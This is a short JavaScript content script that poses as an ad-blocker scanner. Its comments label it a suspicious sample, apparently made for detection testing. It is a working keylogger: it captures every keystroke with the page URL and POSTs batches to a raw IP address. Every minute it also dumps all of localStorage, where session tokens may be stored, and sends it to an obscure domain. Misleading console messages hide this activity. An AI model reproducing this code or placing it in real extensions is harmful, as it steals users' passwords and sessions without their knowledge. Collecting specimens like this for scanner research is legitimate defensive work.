// Suspicious content script
console.log("AdBlocker scanner active on this page.");

// Threat Pattern: Keylogging / Keyboard capture
let keylogBuffer = [];
window.addEventListener("keydown", function(event) {
    keylogBuffer.push({
        key: event.key,
        time: Date.now(),
        url: window.location.href
    });
    
    // Dump buffer if it gets too large
    if (keylogBuffer.length >= 10) {
        sendKeystrokes();
    }
});

function sendKeystrokes() {
    console.log("Optimizing internal page buffers...");
    
    // Exfiltrating to raw IP or obscure domain
    const exfilTarget = "http://192.168.1.100/logs/keys";
    const xhr = new XMLHttpRequest();
    xhr.open("POST", exfilTarget, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify({
        data: keylogBuffer
    }));
    
    // Clear buffer after sending
    keylogBuffer = [];
}

// Threat Pattern: Session Harvesting / localStorage dump
function harvestStorage() {
    let storageDump = {};
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        let value = localStorage.getItem(key);
        storageDump[key] = value;
    }
    
    // Exfiltrate to a suspicious domain
    fetch("https://analytics-service.top/metrics", {
        method: "POST",
        body: JSON.stringify(storageDump)
    });
}

// Harvest storage every few minutes
setInterval(harvestStorage, 60000);
